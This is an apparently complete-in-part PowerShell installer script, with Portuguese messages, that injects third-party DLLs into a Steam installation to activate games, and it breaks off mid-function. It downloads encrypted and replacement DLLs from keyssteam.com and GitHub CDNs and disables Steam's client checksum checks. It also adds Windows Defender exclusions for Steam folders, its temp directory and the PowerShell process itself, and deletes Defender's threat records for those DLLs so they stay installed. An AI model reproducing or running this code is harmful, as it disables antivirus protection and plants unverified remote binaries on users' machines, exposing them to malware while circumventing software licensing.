$Host.UI.RawUI.WindowTitle = "Ativando key"
$ostPayloadBaseUrl = "https://keyssteam.com/install/sk-ost-payload-new"
$ostReleaseNorm = "sk-fd520191"
$ostChannel = "new"
$skipOstDllIfHashMatch = $true
$enableLuaRepairSchedule = $false
$runInstalledLuaRepair = $true
$recoverMode = $false
$script:SkDeferFullLuaRestore = $false
$ostFiles = @(
    @{ Name = "dwmapi.dll"; EncFile = "dwmapi.dll.enc"; Sha = "9AE9E20D0809CC6F13B7EC6124DCD01D68817AAAE9488E2EF839564BF24C5A9C" }
    @{ Name = "xinput1_4.dll"; EncFile = "xinput1_4.dll.enc"; Sha = "8BF7E1BF6E1BC44A722C2BEDE8E2EAD00FBE0210B00101B900BB68AC9F57F862" }
    @{ Name = "OpenSteamTool.dll"; EncFile = "OpenSteamTool.dll.enc"; Sha = "FD5201916459ABDA2CA892DDF0D52C4E9DF3FA9ADAFA5D45BE2ECE32D1081056" }
)
$fallbackDllBase = "https://keyssteam.com"
$steamPinHostedPath = "install/steam-pin"
$steamPinUiSha = "AF6CA9193DD6D502FAD83D4A51EA29FE156699C2DFCF5739F9F70CA659D2B83D"
$steamPinClientSha = "86112382982FA855086F566B2FB8343290E798849029337DCFEECBA0D5051B5E"
$steamPatternCdn = "https://raw.githubusercontent.com/OpenSteam001/steam-monitor/pattern"
$steamIpcCdn = "https://raw.githubusercontent.com/OpenSteam001/steam-monitor/ipc"
$steamPatternCdnFallback = "https://cdn.jsdelivr.net/gh/OpenSteam001/steam-monitor@pattern"
$steamIpcCdnFallback = "https://cdn.jsdelivr.net/gh/OpenSteam001/steam-monitor@ipc"

[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
chcp 65001 > $null
$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

if (-not $env:TEMP -or -not (Test-Path $env:TEMP)) {
  $env:TEMP = Join-Path $env:WINDIR 'Temp'
  $env:TMP = $env:TEMP
}

$script:SkTmp = $null
function Get-TmpPath([string]$ext = "") {
  $root = $script:SkTmp
  if (-not $root -or -not (Test-Path $root)) { $root = $env:TEMP }
  $leaf = [guid]::NewGuid().ToString()
  if ($ext) { $leaf = $leaf + $ext }
  return (Join-Path $root $leaf)
}
function Download-File([string]$Url, [string]$OutFile, $Headers = $null) {
  for ($i = 0; $i -lt 3; $i++) {
    try {
      if (Test-Path $OutFile) { Remove-Item $OutFile -Force -ErrorAction SilentlyContinue }
      $p = @{
        Uri             = $Url
        OutFile         = $OutFile
        UseBasicParsing = $true
        TimeoutSec      = 120
        UserAgent       = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) SK-Installer2'
      }
      if ($Headers -and $Headers.Count -gt 0) { $p['Headers'] = $Headers }
      Invoke-WebRequest @p *> $null
      if ((Test-Path $OutFile) -and ((Get-Item $OutFile).Length -gt 0)) { return $true }
    } catch { Start-Sleep -Seconds 2 }
  }
  return $false
}

$coverStatus = 'Alterando a regiao da Steam...'
$script:SkProgressRow = $null
function Show-Banner {
  try { Clear-Host } catch {}
  Write-Host ""
  Write-Host '███████╗████████╗███████╗ █████╗ ███╗   ███╗' -ForegroundColor Cyan
  Write-Host '██╔════╝╚══██╔══╝██╔════╝██╔══██╗████╗ ████║' -ForegroundColor Cyan
  Write-Host '███████╗   ██║   █████╗  ███████║██╔████╔██║' -ForegroundColor Cyan
  Write-Host '╚════██║   ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║' -ForegroundColor Cyan
  Write-Host '███████║   ██║   ███████╗██║  ██║██║ ╚═╝ ██║' -ForegroundColor Cyan
  Write-Host '╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝' -ForegroundColor Cyan
  Write-Host ""
  Write-Host ""
}
function Step([int]$pct, [string]$status) {
  if ($pct -lt 0) { $pct = 0 } elseif ($pct -gt 100) { $pct = 100 }
  $filled = [int][math]::Floor($pct / 5)
  $bar = ('#' * $filled).PadRight(20, '.')
  $line = ("  {0}  [{1}] {2,3}%" -f $coverStatus, $bar, $pct).PadRight(78)
  if ($null -eq $script:SkProgressRow) {
    try {
      Write-Host $line -ForegroundColor Gray -NoNewline
      $script:SkProgressRow = [Console]::CursorTop
      [Console]::Out.Flush()
      return
    } catch {
      $script:SkProgressRow = -1
    }
  }
  if ($script:SkProgressRow -lt 0) {
    Write-Host $line -ForegroundColor Gray
    return
  }
  try {
    [Console]::SetCursorPosition(0, $script:SkProgressRow)
    [Console]::Write($line)
    [Console]::Out.Flush()
  } catch {
    Write-Host ("`r" + $line) -ForegroundColor Gray -NoNewline
  }
}
function Step-NewLine {
  $script:SkProgressRow = $null
  try { [Console]::WriteLine() } catch { Write-Host "" }
}
function Fail([string]$msg) {
  try { [Console]::WriteLine() } catch {}
  Write-Host ""
  Write-Host "  Nao foi possivel concluir a operacao." -ForegroundColor Red
  Write-Host ("  Codigo: " + $msg) -ForegroundColor Yellow
  Write-Host ""
  if ([Environment]::UserInteractive) {
    Write-Host "  Pressione Enter para fechar..." -ForegroundColor DarkGray
    try { [void](Read-Host) } catch {}
  }
  exit 1
}
function Test-SteamUiReady {
  param([string]$SteamRoot)
  try {
    $win = Get-Process -Name steamwebhelper -ErrorAction SilentlyContinue |
      Where-Object { $_.MainWindowTitle -eq 'Steam' } |
      Select-Object -First 1
    if ($win) { return $true }
  } catch {}
  $logPath = Join-Path $SteamRoot 'logs\console_log.txt'
  if (-not (Test-Path -LiteralPath $logPath)) { return $false }
  try {
    $verHit = Select-String -Path $logPath -Pattern 'Client version:\s*(\d+)' -ErrorAction SilentlyContinue | Select-Object -Last 1
    if ($verHit -and [int64]$verHit.Matches[0].Groups[1].Value -gt 0) { return $true }
    $startupHit = Select-String -Path $logPath -Pattern 'System startup time:' -ErrorAction SilentlyContinue | Select-Object -Last 1
    if ($startupHit -and $startupHit.Line -match '\[(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})\]') {
      $ts = [DateTime]::ParseExact($Matches[1], 'yyyy-MM-dd HH:mm:ss', $null)
      if ($ts -gt (Get-Date).AddMinutes(-3)) { return $true }
    }
  } catch {}
  return $false
}
function Open-SteamActivateDialog {
  param([string]$SteamRoot)
  $exe = Join-Path $SteamRoot 'steam.exe'
  foreach ($null in 1..3) {
    try { Start-Process 'steam://open/activateproduct' | Out-Null } catch {}
    try {
      if (Test-Path -LiteralPath $exe) {
        Start-Process -FilePath $exe -WorkingDirectory $SteamRoot -ArgumentList 'steam://open/activateproduct' | Out-Null
      }
    } catch {}
    Start-Sleep -Seconds 2
  }
}
function Start-SteamAfterInstall {
  param([string]$SteamRoot)
  $exe = Join-Path $SteamRoot 'steam.exe'
  if (-not (Test-Path -LiteralPath $exe)) { return }
  $baseArgs = @('-foreground', '-clearbeta', '-cef-disable-gpu', '-cef-disable-gpu-compositing')
  try {
    if (-not (Get-Process -Name steam -ErrorAction SilentlyContinue)) {
      Start-Process -FilePath $exe -WorkingDirectory $SteamRoot -ArgumentList $baseArgs | Out-Null
    } else {
      try {
        Start-Process -FilePath $exe -WorkingDirectory $SteamRoot -ArgumentList @('-foreground') | Out-Null
      } catch {}
    }
  } catch { return }
  $ready = $false
  $deadline = (Get-Date).AddSeconds(120)
  while ((Get-Date) -lt $deadline) {
    Start-Sleep -Seconds 2
    if (Test-SteamUiReady $SteamRoot) {
      $ready = $true
      break
    }
  }
  if (-not $ready) { return }
  Start-Sleep -Seconds 4
  Open-SteamActivateDialog $SteamRoot
  if ($script:SkDeferFullLuaRestore) {
    Start-Sleep -Seconds 45
    try { Start-LuaRepairOnce -SteamRoot $SteamRoot } catch {}
  }
}

function Get-SteamPath {
  $candidates = @(
    'HKLM:\SOFTWARE\WOW6432Node\Valve\Steam',
    'HKLM:\SOFTWARE\Valve\Steam',
    'HKCU:\Software\Valve\Steam'
  )
  foreach ($key in $candidates) {
    try {
      $prop = Get-ItemProperty $key -ErrorAction Stop
      if ($prop.InstallPath -and (Test-Path $prop.InstallPath)) { return $prop.InstallPath }
      if ($prop.SteamPath -and (Test-Path $prop.SteamPath)) { return $prop.SteamPath }
    } catch {}
  }
  return $null
}
function Write-Utf8NoBom([string]$Path, [string]$Content) {
  $dir = Split-Path $Path -Parent
  if ($dir -and -not (Test-Path $dir)) {
    New-Item -Path $dir -ItemType Directory -Force | Out-Null
  }
  [System.IO.File]::WriteAllText($Path, $Content, [System.Text.UTF8Encoding]::new($false))
}
function Get-Sha256([string]$path) {
  if (-not (Test-Path $path)) { return $null }
  try { return (Get-FileHash -LiteralPath $path -Algorithm SHA256).Hash } catch { return $null }
}
function Test-PeFile([string]$path) {
  try {
    if (-not (Test-Path $path)) { return $false }
    $fs = [System.IO.File]::OpenRead($path)
    try {
      if ($fs.Length -lt 2) { return $false }
      $buf = New-Object byte[] 2
      [void]$fs.Read($buf, 0, 2)
    } finally { $fs.Dispose() }
    return ($buf[0] -eq 0x4D -and $buf[1] -eq 0x5A)
  } catch { return $false }
}
function Set-FileHidden([string]$Path) {
  try {
    if (-not (Test-Path -LiteralPath $Path)) { return }
    $item = Get-Item -LiteralPath $Path -Force
    $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden
  } catch {}
}

Show-Banner
Step 2 "Preparando ambiente..."
$steam = Get-SteamPath
if (-not $steam) { Fail "steam" }

$script:SkTmp = Join-Path $steam "sk-install-tmp"
try {
  if (Test-Path $script:SkTmp) { Remove-Item $script:SkTmp -Recurse -Force -ErrorAction SilentlyContinue }
  New-Item -Path $script:SkTmp -ItemType Directory -Force *> $null
} catch { $script:SkTmp = $env:TEMP }

try {
  function Stop-SteamFully {
    foreach ($n in @("steam", "steamwebhelper", "steamservice", "GameOverlayUI", "steammonitor")) {
      try { Get-Process -Name $n -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue } catch {}
    }
    try {
      $svc = Get-Service -Name "Steam Client Service" -ErrorAction SilentlyContinue
      if ($svc -and $svc.Status -eq 'Running') {
        Stop-Service -Name "Steam Client Service" -Force -ErrorAction SilentlyContinue
      }
    } catch {}
    $deadline = (Get-Date).AddSeconds(25)
    while ((Get-Process -Name steam, steamwebhelper -ErrorAction SilentlyContinue) -and ((Get-Date) -lt $deadline)) {
      try { Get-Process -Name steam, steamwebhelper -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue } catch {}
      Start-Sleep -Milliseconds 300
    }
    Start-Sleep -Milliseconds 800
  }

  
  function Clear-SteamFileForReplace([string]$Path) {
    if (-not (Test-Path -LiteralPath $Path)) { return }
    for ($i = 0; $i -lt 10; $i++) {
      try {
        $item = Get-Item -LiteralPath $Path -Force -ErrorAction Stop
        $item.Attributes = [System.IO.FileAttributes]::Normal
        Remove-Item -LiteralPath $Path -Force -ErrorAction Stop
        if (-not (Test-Path -LiteralPath $Path)) { return }
      } catch {}
      Start-Sleep -Milliseconds 300
    }
  }

  function Copy-IntoSteamRoot([string]$Source, [string]$Destination) {
    $maxTries = 60
    for ($try = 0; $try -lt $maxTries; $try++) {
      if ($try -gt 0 -and ($try % 5) -eq 0) {
        try { Stop-SteamFully } catch {}
        try { Restore-DefenderQuarantineSafe (Split-Path $Destination -Parent) | Out-Null } catch {}
        try { Add-DefenderExclusionsForSteam (Split-Path $Destination -Parent) | Out-Null } catch {}
      }
      Clear-SteamFileForReplace $Destination
      $staging = $Destination + ".sk-new"
      Clear-SteamFileForReplace $staging
      $ok = $false
      foreach ($method in @("item", "file", "staging")) {
        try {
          if ($method -eq "item") {
            Copy-Item -LiteralPath $Source -Destination $Destination -Force -ErrorAction Stop
          } elseif ($method -eq "file") {
            [System.IO.File]::Copy($Source, $Destination, $true)
          } else {
            Copy-Item -LiteralPath $Source -Destination $staging -Force -ErrorAction Stop
            if (Test-Path -LiteralPath $Destination) {
              Clear-SteamFileForReplace $Destination
            }
            [System.IO.File]::Move($staging, $Destination)
          }
          if ((Test-Path -LiteralPath $Destination) -and ((Get-Item -LiteralPath $Destination).Length -gt 0)) {
            $ok = $true
            break
          }
        } catch {}
      }
      if ($ok) { return $true }
      $delay = 400 + [int][math]::Min(2400, $try * 90)
      Start-Sleep -Milliseconds $delay
    }
    return $false
  }


  
function Get-ProcessPathsSafe {
  $paths = @()
  foreach ($name in @("powershell", "pwsh", "steam", "steamwebhelper")) {
    try {
      Get-Process -Name $name -ErrorAction SilentlyContinue | ForEach-Object {
        try { if ($_.Path) { $paths += $_.Path } } catch {}
      }
    } catch {}
  }
  return ($paths | Select-Object -Unique)
}

function Add-DefenderExclusionProcessSafe {
  param([string]$Path)
  if (-not $Path) { return $false }
  try {
    $null = Add-MpPreference -ExclusionProcess $Path -ErrorAction SilentlyContinue
    return $true
  } catch { return $false }
}

function Restore-DefenderQuarantineSafe {
  param([string]$SteamRoot)
  $restored = 0
  try {
    $threats = Get-MpThreat -ErrorAction SilentlyContinue
    if (-not $threats) { return 0 }
    $dllNames = @("dwmapi.dll", "xinput1_4.dll", "OpenSteamTool.dll", "millennium.dll")
    $steamRootLower = $SteamRoot.ToLower()
    foreach ($t in $threats) {
      $resource = $t.Resources
      if (-not $resource) { continue }
      foreach ($r in $resource) {
        $rStr = [string]$r
        $matched = $false
        foreach ($dll in $dllNames) {
          if ($rStr.ToLower().Contains($dll.ToLower())) { $matched = $true; break }
        }
        if (-not $matched) { continue }
        if ($rStr.ToLower() -like ($steamRootLower + '*')) {
          try {
            $null = Add-MpPreference -ExclusionPath (Split-Path $rStr -Parent) -ErrorAction SilentlyContinue
            $null = Remove-MpThreat -ThreatID $t.ThreatID -ErrorAction SilentlyContinue
            $restored++
          } catch {}
        }
      }
    }
  } catch {}
  return $restored
}

function Get-SteamLibraryPaths([string]$SteamRoot) {
  $paths = New-Object System.Collections.Generic.List[string]
  if ($SteamRoot) { [void]$paths.Add($SteamRoot) }
  $stplug = Join-Path $SteamRoot "config\stplug-in"
  try { if ([System.IO.Directory]::Exists($stplug)) { [void]$paths.Add($stplug) } } catch {}
  $defaultCommon = Join-Path $SteamRoot "steamapps\common"
  try { if ([System.IO.Directory]::Exists($defaultCommon)) { [void]$paths.Add($defaultCommon) } } catch {}
  $vdf = Join-Path $SteamRoot "steamapps\libraryfolders.vdf"
  if ([System.IO.File]::Exists($vdf)) {
    try {
      $raw = [System.IO.File]::ReadAllText($vdf)
      foreach ($m in [regex]::Matches($raw, '"path"\s*"([^"]+)"')) {
        $p = ($m.Groups[1].Value -replace '\\\\', '\\').Trim()
        if (-not $p) { continue }
        try {
          if (-not [System.IO.Directory]::Exists($p)) { continue }
          [void]$paths.Add($p)
          $common = Join-Path $p "steamapps\common"
          if ([System.IO.Directory]::Exists($common)) { [void]$paths.Add($common) }
        } catch {}
      }
    } catch {}
  }
  return @($paths | Select-Object -Unique)
}

function Add-DefenderExclusionPath([string]$Path) {
  if (-not $Path) { return $false }
  try {
    if (-not [System.IO.Directory]::Exists($Path) -and -not [System.IO.File]::Exists($Path)) { return $false }
  } catch { return $false }
  try {
    $null = Add-MpPreference -ExclusionPath $Path -ErrorAction Stop
    return $true
  } catch {
    return $false
  }
}

function Add-DefenderExclusionsForSteam([string]$SteamRoot) {
  $added = 0
  foreach ($p in (Get-SteamLibraryPaths $SteamRoot)) {
    if (Add-DefenderExclusionPath $p) { $added++ }
  }
  if ($script:SkTmp -and (Test-Path $script:SkTmp)) {
    if (Add-DefenderExclusionPath $script:SkTmp) { $added++ }
  }
  foreach ($procPath in (Get-ProcessPathsSafe)) {
    if (Add-DefenderExclusionProcessSafe $procPath) { $added++ }
  }
  return $added
}


  
  function Remove-SteamBeta {
    param([string]$SteamRoot)
    $betaPath = Join-Path $SteamRoot "package\\beta"
    if (Test-Path $betaPath) {
      try { Remove-Item $betaPath -Recurse -Force -ErrorAction SilentlyContinue } catch {}
    }
    try {
      $cfg = Join-Path $SteamRoot "config\\config.vdf"
      if (Test-Path $cfg) {
        $text = (Get-Content $cfg -Raw -ErrorAction Stop) + ""
        $text2 = $text -replace '(?i)"BetaKey"\\s+"[^"]*"', '"BetaKey" "public"'
        if ($text2 -ne $text) {
          [System.IO.File]::WriteAllText($cfg, $text2, [System.Text.UTF8Encoding]::new($false))
        }
      }
    } catch {}
  }

  function Test-RemoteToml([string[]]$Urls) {
    foreach ($url in $Urls) {
      if (-not $url) { continue }
      try {
        $r = Invoke-WebRequest -Uri $url -Method Head -UseBasicParsing -TimeoutSec 8 -UserAgent 'Mozilla/5.0 SK-Installer'
        if ($r.StatusCode -eq 200) { return $true }
      } catch {}
    }
    return $false
  }

  function Get-RemoteTomlUrls([string]$Channel, [string]$RemoteDir, [string]$Sha) {
    $sha = ($Sha + "").ToLower()
    $urls = @()
    if ($Channel -eq "pattern") {
      if ($steamPatternCdn) { $urls += ($steamPatternCdn + "/" + $RemoteDir + "/" + $sha + ".toml") }
      if ($steamPatternCdnFallback) {
        $urls += ($steamPatternCdnFallback + "/" + $RemoteDir + "/" + $sha + ".toml")
      }
    } else {
      if ($steamIpcCdn) { $urls += ($steamIpcCdn + "/" + $RemoteDir + "/" + $sha + ".toml") }
      if ($steamIpcCdnFallback) { $urls += ($steamIpcCdnFallback + "/" + $RemoteDir + "/" + $sha + ".toml") }
    }
    return $urls
  }

  function Download-RemoteToml([string[]]$Urls, [string]$Dest) {
    foreach ($url in $Urls) {
      if (-not $url) { continue }
      $tmp = Get-TmpPath ".toml"
      try {
        if (Download-File $url $tmp) {
          Copy-Item -Path $tmp -Destination $Dest -Force -ErrorAction Stop
          return $true
        }
      } catch {} finally {
        if (Test-Path $tmp) { Remove-Item $tmp -Force -ErrorAction SilentlyContinue }
      }
    }
    return $false
  }

  function Test-SteamClientSupported {
    param([string]$SteamRoot)
    $uiPath = Join-Path $SteamRoot "steamui.dll"
    $clPath = Join-Path $SteamRoot "steamclient64.dll"
    if (-not (Test-Path $uiPath) -or -not (Test-Path $clPath)) { return $false }
    $ui = Get-Sha256 $uiPath
    $cl = Get-Sha256 $clPath
    if (-not $ui -or -not $cl) { return $false }
    $uiOk = Test-RemoteToml (Get-RemoteTomlUrls "pattern" "steamui" $ui)
    $clOk = Test-RemoteToml (Get-RemoteTomlUrls "pattern" "steamclient" $cl)
    $ipcOk = Test-RemoteToml (Get-RemoteTomlUrls "ipc" "steamclient" $cl)
    return ($uiOk -and $clOk -and $ipcOk)
  }

  function Test-SteamClientPinned {
    param([string]$SteamRoot)
    if (-not $steamPinUiSha -or -not $steamPinClientSha) { return $false }
    $uiPath = Join-Path $SteamRoot "steamui.dll"
    $clPath = Join-Path $SteamRoot "steamclient64.dll"
    if (-not (Test-Path $uiPath) -or -not (Test-Path $clPath)) { return $false }
    $ui = Get-Sha256 $uiPath
    $cl = Get-Sha256 $clPath
    if (-not $ui -or -not $cl) { return $false }
    return (($ui.ToUpper() -eq $steamPinUiSha) -and ($cl.ToUpper() -eq $steamPinClientSha))
  }

  function Backup-SteamClientDlls {
    param([string]$SteamRoot)
    foreach ($name in @("steamui.dll", "steamclient64.dll")) {
      $src = Join-Path $SteamRoot $name
      $bak = Join-Path $SteamRoot ($name + ".sk-bak")
      if (-not (Test-Path -LiteralPath $src)) { continue }
      if (Test-Path -LiteralPath $bak) { continue }
      try { Copy-Item -LiteralPath $src -Destination $bak -Force -ErrorAction Stop } catch {}
    }
  }

  function Undo-HostedPinDll {
    param([string]$SteamRoot)
    $pairs = @(
      @{ Name = "steamui.dll"; Want = $steamPinUiSha },
      @{ Name = "steamclient64.dll"; Want = $steamPinClientSha }
    )
    foreach ($pair in $pairs) {
      if (-not $pair.Want) { continue }
      $dst = Join-Path $SteamRoot $pair.Name
      $bak = Join-Path $SteamRoot ($pair.Name + ".sk-bak")
      if (-not (Test-Path -LiteralPath $bak)) { continue }
      $cur = Get-Sha256 $dst
      if (-not $cur) { continue }
      if ($cur.ToUpper() -ne $pair.Want.ToUpper()) { continue }
      try { Copy-Item -LiteralPath $bak -Destination $dst -Force -ErrorAction Stop } catch {}
    }
  }

  function Repair-SteamClientDlls {
    param([string]$SteamRoot)
    foreach ($name in @("steamui.dll", "steamclient64.dll")) {
      $dst = Join-Path $SteamRoot $name
      $bak = Join-Path $SteamRoot ($name + ".sk-bak")
      $broken = $false
      if (-not (Test-Path -LiteralPath $dst)) { $broken = $true }
      elseif (-not (Test-PeFile $dst)) { $broken = $true }
      else {
        try { if ((Get-Item -LiteralPath $dst).Length -lt 1024) { $broken = $true } } catch { $broken = $true }
      }
      if (-not $broken) { continue }
      if (Test-Path -LiteralPath $bak) {
        try { Copy-Item -LiteralPath $bak -Destination $dst -Force -ErrorAction Stop } catch {}
      }
    }
  }

  function Test-SteamClientDllsHealthy {
    param([string]$SteamRoot)
    foreach ($name in @("steamui.dll", "steamclient64.dll")) {
      $path = Join-Path $SteamRoot $name
      if (-not (Test-Path -LiteralPath $path)) { return $false }
      if (-not (Test-PeFile $path)) { return $false }
      try { if ((Get-Item -LiteralPath $path).Length -lt 1024) { return $false } } catch { return $false }
    }
    return $true
  }

  function Clear-SteamBootstrapPending {
    param([string]$SteamRoot)
    $pkg = Join-Path $SteamRoot "package"
    if (-not (Test-Path $pkg)) { return }
    foreach ($pattern in @("*.zip", "*.manifest")) {
      Get-ChildItem -Path $pkg -Filter $pattern -File -ErrorAction SilentlyContinue | ForEach-Object {
        try { Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue } catch {}
      }
    }
    $beta = Join-Path $pkg "beta"
    if (Test-Path $beta) {
      try { Remove-Item $beta -Recurse -Force -ErrorAction SilentlyContinue } catch {}
    }
  }

  function Clear-SteamClientPackage {
    param([string]$SteamRoot)
    $pkg = Join-Path $SteamRoot "package"
    if (-not (Test-Path $pkg)) { return }
    foreach ($child in (Get-ChildItem -Path $pkg -Force -ErrorAction SilentlyContinue)) {
      try { Remove-Item $child.FullName -Recurse -Force -ErrorAction SilentlyContinue } catch {}
    }
  }

  function Install-SteamClientPinDll {
    param([string]$SteamRoot)
    if (-not $steamPinHostedPath -or -not $steamPinUiSha -or -not $steamPinClientSha) { return "nourl" }
    $base = $fallbackDllBase.TrimEnd('/') + '/' + $steamPinHostedPath.Trim('/')
    $items = @(
      @{ Name = "steamui.dll"; Want = $steamPinUiSha },
      @{ Name = "steamclient64.dll"; Want = $steamPinClientSha }
    )
    foreach ($item in $items) {
      $tmp = Get-TmpPath
      try {
        $url = $base + '/' + $item.Name
        if (-not (Download-File $url $tmp)) { return "dl" }
        if (-not (Test-PeFile $tmp)) { return "dl" }
        $got = Get-Sha256 $tmp
        if (-not $got -or ($got.ToUpper() -ne $item.Want.ToUpper())) { return "hash" }
        $dst = Join-Path $SteamRoot $item.Name
        if (-not (Copy-IntoSteamRoot $tmp $dst)) { return "copy" }
      } finally {
        if (Test-Path $tmp) { Remove-Item $tmp -Force -ErrorAction SilentlyContinue }
      }
    }
    return ""
  }

  function Install-SteamOstPatternCache {
    param([string]$SteamRoot)
    $uiSha = ((Get-Sha256 (Join-Path $SteamRoot "steamui.dll")) + "").ToLower()
    $clSha = ((Get-Sha256 (Join-Path $SteamRoot "steamclient64.dll")) + "").ToLower()
    if (-not $uiSha -or -not $clSha) { return }
    $ostRoot = Join-Path $SteamRoot "opensteamtool"
    $jobs = @(
      @{ Channel = "pattern"; Remote = "steamui"; Local = "steamui"; Sha = $uiSha },
      @{ Channel = "pattern"; Remote = "steamclient"; Local = "steamclient"; Sha = $clSha },
      @{ Channel = "ipc"; Remote = "steamclient"; Local = "steamclient"; Sha = $clSha }
    )
    foreach ($job in $jobs) {
      $dir = Join-Path $ostRoot ($job.Channel + '\\' + $job.Local)
      if (-not (Test-Path $dir)) { New-Item -Path $dir -ItemType Directory -Force *> $null }
      $dest = Join-Path $dir ($job.Sha + ".toml")
      if (Test-Path $dest) { continue }
      $urls = Get-RemoteTomlUrls $job.Channel $job.Remote $job.Sha
      [void](Download-RemoteToml $urls $dest)
    }
  }

  function Repair-SteamUiIndexHtml {
    param([string]$SteamRoot)
    $indexPath = Join-Path $SteamRoot "steamui\index.html"
    $jsPath = Join-Path $SteamRoot "steamui\sk-launch-override.js"
    if (Test-Path -LiteralPath $jsPath) {
      try { Remove-Item -LiteralPath $jsPath -Force -ErrorAction SilentlyContinue } catch {}
    }
    if (-not (Test-Path -LiteralPath $indexPath)) { return }
    try {
      $html = [System.IO.File]::ReadAllText($indexPath)
      $dirty = $false
      if ($html -match 'sk-launch-override') {
        $html = [regex]::Replace(
          $html,
          '\s*<script[^>]*sk-launch-override\.js[^>]*>\s*</script>|<script[^>]*sk-launch-override\.js[^>]*/>',
          ''
        )
        $dirty = $true
      }
      if ($html -match "(?i)<!doctypehtml>|<htmlstyle=|<metacharset=|<scriptdefer|<linkhref=|<bodystyle='") {
        try { Remove-Item -LiteralPath $indexPath -Force -ErrorAction Stop } catch {}
        return
      }
      if ($dirty) {
        [System.IO.File]::WriteAllText($indexPath, $html, [System.Text.UTF8Encoding]::new($false))
      }
    } catch {}
  }

  function Ensure-SteamFastBootCfg {
    param(
      [string]$SteamRoot,
      [switch]$Pinned
    )
    if (-not $Pinned) { return }
    $cfgPath = Join-Path $SteamRoot "steam.cfg"
    $wanted = @(
      'BootStrapperInhibitClientChecksum=Enable',
      'BootStrapperInhibitBootstrapperChecksum=Enable'
    )
    $content = ($wanted -join [Environment]::NewLine) + [Environment]::NewLine
    [System.IO.File]::WriteAllText($cfgPath, $content, [System.Text.UTF8Encoding]::new($false))
  }

  function Ensure-SteamGpuWebViewsDisabled {
    try {
      $key = 'HKCU:\Software\Valve\Steam'
      if (-not (Test-Path -LiteralPath $key)) {
        New-Item -Path $key -Force | Out-Null
      }
      New-ItemProperty -Path $key -Name 'GPUAccelWebViewsV3' -PropertyType DWord -Value 0 -Force | Out-Null
    } catch {}
  }

  function Get-SteamConsoleClientVersion {
    param([string]$SteamRoot)
    $logPath = Join-Path $SteamRoot "logs\\console_log.txt"
    if (-not (Test-Path -LiteralPath $logPath)) { return $null }
    try {
      $hit = Select-String -Path $logPath -Pattern 'Client version:\s*(\d+)' | Select-Object -Last 1
      if (-not $hit) { return $null }
      return [int64]$hit.Matches[0].Groups[1].Value
    } catch {
      return $null
    }
  }

  function Test-SteamNeedsBootstrapRepair {
    param([string]$SteamRoot)
    $ver = Get-SteamConsoleClientVersion $SteamRoot
    if ($ver -eq 0) { return $true }
    if (-not (Test-SteamClientDllsHealthy $SteamRoot)) { return $true }
    $exe = Join-Path $SteamRoot "steam.exe"
    $old = Join-Path $SteamRoot "steam.exe.old"
    if ((Test-Path -LiteralPath $exe) -and (Test-Path -LiteralPath $old)) {
      try {
        $exeItem = Get-Item -LiteralPath $exe -Force
        $oldItem = Get-Item -LiteralPath $old -Force
        if ($oldItem.Length -gt ($exeItem.Length + 65536)) { return $true }
        if ($oldItem.LastWriteTime -gt $exeItem.LastWriteTime.AddDays(30)) { return $true }
      } catch {}
    }
    return $false
  }

  function Disable-SteamFastBootCfg {
    param([string]$SteamRoot)
    $cfgPath = Join-Path $SteamRoot "steam.cfg"
    if (-not (Test-Path -LiteralPath $cfgPath)) { return }
    $off = $cfgPath + ".skoff"
    try {
      if (-not (Test-Path -LiteralPath $off)) {
        Copy-Item -LiteralPath $cfgPath -Destination $off -Force -ErrorAction Stop
      }
      Remove-Item -LiteralPath $cfgPath -Force -ErrorAction Stop
    } catch {}
  }

  function Restore-SteamExeFromOld {
    param([string]$SteamRoot)
    $exe = Join-Path $SteamRoot "steam.exe"
    $old = Join-Path $SteamRoot "steam.exe.old"
    if (-not (Test-Path -LiteralPath $old)) { return $false }
    try {
      Copy-Item -LiteralPath $old -Destination $exe -Force -ErrorAction Stop
      return $true
    } catch {
      return $false
    }
  }

  function Restore-SteamClientFromBackup {
    param([string]$SteamRoot)
    if (Restore-SteamClientFromLock $SteamRoot) { return }
    Undo-HostedPinDll $SteamRoot
    foreach ($name in @("steamui.dll", "steamclient64.dll")) {
      $dst = Join-Path $SteamRoot $name
      $bak = Join-Path $SteamRoot ($name + ".sk-bak")
      if (Test-Path -LiteralPath $bak) {
        try {
          if (Test-Path -LiteralPath $dst) {
            try { [IO.File]::SetAttributes($dst, [IO.FileAttributes]::Normal) } catch {}
          }
          Copy-Item -LiteralPath $bak -Destination $dst -Force -ErrorAction Stop
          continue
        } catch {}
      }
      if (-not (Test-Path -LiteralPath $dst)) { continue }
      $bad = Join-Path $SteamRoot ($name + ".sk-badpin")
      if (Test-Path -LiteralPath $bad) { continue }
      try {
        [IO.File]::SetAttributes($dst, [IO.FileAttributes]::Normal)
        Rename-Item -LiteralPath $dst -NewName ($name + ".sk-badpin") -Force -ErrorAction SilentlyContinue
      } catch {}
    }
  }

  function Get-SteamClientLockPath {
    param([string]$SteamRoot)
    return Join-Path $SteamRoot "opensteamtool\client-lock.json"
  }

  function Test-SteamClientWorking {
    param([string]$SteamRoot)
    if (-not (Test-SteamClientDllsHealthy $SteamRoot)) { return $false }
    $ver = Get-SteamConsoleClientVersion $SteamRoot
    if ($ver -and $ver -ge 1) { return $true }
    return Test-SteamClientMatchesLock $SteamRoot
  }

  function Test-SteamClientMatchesLock {
    param([string]$SteamRoot)
    $lockPath = Get-SteamClientLockPath $SteamRoot
    if (-not (Test-Path -LiteralPath $lockPath)) { return $false }
    try {
      $lock = Get-Content -LiteralPath $lockPath -Raw -ErrorAction Stop | ConvertFrom-Json
      $uiPath = Join-Path $SteamRoot "steamui.dll"
      $clPath = Join-Path $SteamRoot "steamclient64.dll"
      $ui = Get-Sha256 $uiPath
      $cl = Get-Sha256 $clPath
      if (-not $ui -or -not $cl) { return $false }
      return (($ui.ToUpper() -eq [string]$lock.steamuiSha) -and ($cl.ToUpper() -eq [string]$lock.steamclient64Sha))
    } catch {
